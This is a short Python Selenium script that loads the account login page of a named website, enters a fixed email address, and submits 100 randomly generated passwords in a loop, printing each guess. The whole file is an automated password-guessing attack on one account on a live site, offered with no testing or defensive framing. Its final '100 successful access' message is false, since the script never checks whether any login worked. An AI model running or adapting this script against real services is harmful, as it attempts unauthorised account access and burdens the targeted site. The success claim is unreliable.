import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://dust2.gg/mi-cuenta/")
time.sleep(5)
letter = string.ascii_letters
numbers = string.digits
simbols = string.punctuation
base = letter + numbers + simbols

username = "tegakoh202@ofenbuy.com"

for i in range(100):
    casillaUser = driver.find_element_by_id("username")
    casillaUser.clear()
    casillaUser.send_keys(username)
    casillaPassword = driver.find_element_by_id("password")
    casillaPassword.clear()
    password = ''.join(random.choice(base) for j in range(10))
    casillaPassword.send_keys(password)
    print(password)
    boton = driver.find_element_by_xpath("//*[@id='customer_login']/div[1]/form/p[3]/button")
    boton.click()

print("100 successful access")